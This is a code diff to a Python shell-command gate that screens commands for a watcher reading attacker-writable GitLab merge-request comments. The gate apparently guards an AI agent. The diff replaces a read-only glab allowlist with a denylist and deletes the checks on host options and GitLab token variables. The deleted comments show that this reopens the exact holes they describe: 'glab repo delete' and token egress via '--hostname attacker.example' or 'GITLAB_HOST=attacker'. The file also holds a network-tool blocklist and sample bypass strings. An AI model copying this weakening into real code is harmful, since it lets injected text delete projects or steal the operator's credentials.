@@ -17,7 +17,6 @@ is the import path callers use; a patch through it reaches this module
 from __future__ import annotations
 
 import logging
-import re
 import shlex
 from types import SimpleNamespace
 from typing import Any
@@ -116,6 +115,30 @@ _FORBIDDEN_SUBCOMMANDS: dict[str, tuple[tuple[str, ...], ...]] = {
         ("secret",),
         ("workflow", "run"),
     ),
+    # The GitLab watcher reads outsider-written MR comments (`glab mr view <url> --comments`),
+    # so `glab` gets exactly the limit `gh` has: each entry is the `glab` twin of one above.
+    "glab": (
+        ("mr", "merge"),
+        ("mr", "accept"),  # glab's alias of `mr merge`
+        ("mr", "update"),  # `pr ready` / `pr edit`
+        ("mr", "close"),
+        ("mr", "note"),  # `pr comment`
+        ("mr", "comment"),  # glab's alias of `mr note`
+        ("mr", "approve"),  # `pr review`
+        ("mr", "create"),
+        ("issue", "note"),
+        ("issue", "comment"),  # glab's alias of `issue note`
+        ("issue", "create"),
+        ("issue", "update"),
+        ("issue", "close"),
+        ("release",),
+        ("auth",),
+        ("api",),
+        ("variable",),  # `secret`
+        ("ci", "run"),  # `workflow run`
+        ("ci", "create"),  # glab's alias of `ci run`
+        ("ci", "push"),  # glab's alias of `ci run`
+    ),
     "git": (
         ("push",),
         ("remote", "set-url"),
@@ -126,79 +149,32 @@ _FORBIDDEN_SUBCOMMANDS: dict[str, tuple[tuple[str, ...], ...]] = {
 #: No subcommand analysis needed: the binary itself is the capability.
 _FORBIDDEN_BINARIES = ("curl", "wget", "nc", "ncat", "netcat", "ssh", "scp", "sftp", "telnet")
 
-#: ``glab`` is authorized by ALLOWLIST, not denylist — the opposite of ``gh``/``git`` above.
-#: The watcher's whole input is attacker-writable MR text, and a denylist only refuses the
-#: verbs someone thought to name: ``glab repo delete group/project --yes`` passes any list
-#: that never enumerated ``repo``. Here a verb runs only if it is one of the READ-ONLY reads
-#: the watcher prompt asks for: ``mr view``/``mr diff`` given the MR url. Project-scoped
-#: reads (``mr list``, ``ci ...``) are not listed because the watcher clone has no remote
-#: for glab to find the project from. Every other verb, including ones that do not exist
-#: yet, is refused by not being listed. The app's own draft MR comes from
-#: ``profiles/gitlab_repo/mr_recipe.py``, which builds its argv directly and never passes
-#: through this gate.
-_GLAB_ALLOWED_SUBCOMMANDS: tuple[tuple[str, ...], ...] = (
-    ("mr", "view"),
-    ("mr", "diff"),
-)
 
-#: ``glab`` options that choose WHICH host the call goes to. An allowed read is still an
-#: egress of the operator's GitLab token, so it must stay on the host glab is configured for:
-#: ``glab mr view <url> --hostname attacker.example`` or ``-R https://attacker.example/g/p`` would
-#: carry the token there. Refused anywhere in the argv, in both the separate and the
-#: ``=``-joined spelling (and ``-Rvalue``).
-_GLAB_HOST_OPTIONS: tuple[str, ...] = ("--hostname", "--repo", "-R")
+def _segments(text: str) -> list[list[str]]:
+    """``text`` split on shell separators, each piece tokenized into shell words.
 
-#: The environment variables glab reads to choose its host, token or config directory,
-#: named exactly so a project's own variables (``GITLAB_CI``, ``GL_*`` build settings) stay
-#: usable. The leading ``VAR=value`` words are stripped before a command is checked, so
-#: without this check ``GITLAB_HOST=attacker glab mr view <url>`` would pass as an allowed
-#: read and send the inherited token to the attacker's host.
-_GLAB_STEERING_VAR = (
-    r"(?:GITLAB_HOST|GL_HOST|GITLAB_URI|GITLAB_API_HOST|GITLAB_TOKEN|GITLAB_ACCESS_TOKEN"
-    r"|OAUTH_TOKEN|GLAB_CONFIG_DIR|XDG_CONFIG_HOME)"
-)
-#: Any MENTION of a steering variable in a command that also runs ``glab``.
-_GLAB_STEERING_MENTION = re.compile(rf"(?<![A-Za-z0-9_]){_GLAB_STEERING_VAR}(?![A-Za-z0-9_])")
-#: A command that SETS a steering variable, with or without ``glab`` in it, so a value set by
-#: one call cannot be picked up by a later ``glab`` call in the same shell.
-_GLAB_STEERING_ASSIGNMENT = re.compile(
-    rf"(?<![A-Za-z0-9_]){_GLAB_STEERING_VAR}\+?="
-    rf"|\b(?:export|setenv|declare|typeset|readonly|local|read)\b[^\n;&|]*"
-    rf"(?<![A-Za-z0-9_]){_GLAB_STEERING_VAR}(?![A-Za-z0-9_])"
-    rf"|\bprintf\s+-v\s*{_GLAB_STEERING_VAR}(?![A-Za-z0-9_])"
-)
-_GLAB_WORD = re.compile(r"(?<![A-Za-z0-9_.-])glab(?![A-Za-z0-9_.-])")
-
-
-def _glab_steering_refusal(text: str) -> str:
-    """A reason when ``text`` could point ``glab`` at another host, else ``""``."""
-    if _GLAB_STEERING_ASSIGNMENT.search(text):
-        return "setting a GitLab host, token or config variable is not allowed here"
-    if _GLAB_WORD.search(text) and _GLAB_STEERING_MENTION.search(text):
-        return "glab cannot run with a GitLab host, token or config variable here"
-    return ""
-
-
-def _glab_refusal(args: list[str]) -> str:
-    """A reason the ``glab`` call with ``args`` (after the binary) must be refused, or ``""``."""
-    for word in args:
-        for opt in _GLAB_HOST_OPTIONS:
-            if word == opt or word.startswith(opt + "=") or (opt == "-R" and word.startswith("-R")):
-                return f"glab {opt} cannot point the call at another host or project here"
-    rest: list[str] = []
-    for word in args:
-        if word.startswith("-"):
-            # No allowed value-taking global option is left once the host options above are
-            # refused, so every remaining option is valueless here.
-            continue
-        rest.append(word.lower())
-    if not any(tuple(rest[: len(p)]) == p for p in _GLAB_ALLOWED_SUBCOMMANDS):
-        shown = " ".join(rest[:2]) if rest else "(no subcommand)"
-        return (
-            f"glab {shown} is not an allowed read-only command here "
-            "(only glab mr view and glab mr diff may run, given the MR url)"
-        )
-    return ""
+    Each shell-separated segment is its own command. ``&&``/``||``/``;``/``|``, a bare
+    ``&``, ``$(``/backtick substitutions and subshell parentheses all start a new one.
+    """
+    normalized = text.replace("&&", "\n").replace("||", "\n").replace(";", "\n")
+    normalized = normalized.replace("|", "\n").replace("$(", "\n").replace("`", "\n")
+    # A BARE `&` backgrounds its left side and starts a new command, exactly like `;` —
+    # but is NOT caught by the `&&` replace above (that consumed the doubled form). Without
+    # this, `true & gh pr comment --body X` tokenizes to `binary='true'` (harmless) and the
+    # `gh pr comment`/`curl` behind the `&` slips past the denylist the watcher's
+    # outsider-writable prompt exists to enforce. Ordered AFTER `&&` so only the single-`&`
+    # separator remains to split on. As with the wrapper options: a parser that inspects
+    # fixed positions is evaded by adding a position.
+    normalized = normalized.replace("&", "\n")
+    # Split on the subshell / command-substitution PARENTHESES too. `$(` and backtick above
+    # open a substitution, but the CLOSING `)` stayed attached to the last inner token, so
+    # `echo $(gh pr ready)` tokenized the verb as `ready)` (≠ `ready`) and slipped past the
+    # `("pr","ready")` denylist; a bare subshell `(gh pr ready)` has the same shape. A `(` or
+    # `)` is never part of a legitimate command word here, so splitting on both isolates the
+    # inner command with no trailing bracket — over-checking at worst, the safe direction for a
+    # denylist.
+    normalized = normalized.replace("(", "\n").replace(")", "\n")
+    return [_shell_words(segment) for segment in normalized.splitlines()]
 
 
 def _shell_words(command: str) -> list[str]:
@@ -297,31 +273,9 @@ def _refusal(text: str, *, depth: int) -> str:
         # Deeper than any legitimate command nests. Refuse rather than give up: this is a
         # denylist, so exhausting the budget must not become a way through it.
         return "command nests shells too deeply to analyze"
-    steering = _glab_steering_refusal(text)
-    if steering:
-        return steering
 
     # Each shell-separated segment is its own command; check them all.
-    normalized = text.replace("&&", "\n").replace("||", "\n").replace(";", "\n")
-    normalized = normalized.replace("|", "\n").replace("$(", "\n").replace("`", "\n")
-    # A BARE `&` backgrounds its left side and starts a new command, exactly like `;` —
-    # but is NOT caught by the `&&` replace above (that consumed the doubled form). Without
-    # this, `true & gh pr comment --body X` tokenizes to `binary='true'` (harmless) and the
-    # `gh pr comment`/`curl` behind the `&` slips past the denylist the watcher's
-    # outsider-writable prompt exists to enforce. Ordered AFTER `&&` so only the single-`&`
-    # separator remains to split on. As with the wrapper options: a parser that inspects
-    # fixed positions is evaded by adding a position.
-    normalized = normalized.replace("&", "\n")
-    # Split on the subshell / command-substitution PARENTHESES too. `$(` and backtick above
-    # open a substitution, but the CLOSING `)` stayed attached to the last inner token, so
-    # `echo $(gh pr ready)` tokenized the verb as `ready)` (≠ `ready`) and slipped past the
-    # `("pr","ready")` denylist; a bare subshell `(gh pr ready)` has the same shape. A `(` or
-    # `)` is never part of a legitimate command word here, so splitting on both isolates the
-    # inner command with no trailing bracket — over-checking at worst, the safe direction for a
-    # denylist.
-    normalized = normalized.replace("(", "\n").replace(")", "\n")
-    for segment in normalized.splitlines():
-        words = _shell_words(segment)
+    for words in _segments(text):
         # Drop leading VAR=value assignments (`GH_TOKEN=x gh api …`).
         while words and "=" in words[0] and not words[0].startswith("-"):
             words = words[1:]
@@ -374,11 +328,7 @@ def _refusal(text: str, *, depth: int) -> str:
                         # crafted `env --unset curl git push` would eat the very binary we must
                         # inspect. A recognized command is left in place to be checked.
                         nxt = wrapped[0].rsplit("/", 1)[-1].lower()
-                        if (
-                            nxt in _FORBIDDEN_SUBCOMMANDS
-                            or nxt in _FORBIDDEN_BINARIES
-                            or nxt == "glab"
-                        ):
+                        if nxt in _FORBIDDEN_SUBCOMMANDS or nxt in _FORBIDDEN_BINARIES:
                             break
                         wrapped = wrapped[1:]
             for _ in range(_COMMAND_WRAPPERS[binary]):
@@ -393,11 +343,6 @@ def _refusal(text: str, *, depth: int) -> str:
             continue
         if binary in _FORBIDDEN_BINARIES:
             return f"{binary!r} cannot be run here"
-        if binary == "glab":
-            reason = _glab_refusal(words[1:])
-            if reason:
-                return reason
-            continue
         forbidden = _FORBIDDEN_SUBCOMMANDS.get(binary)
         if not forbidden:
             continue
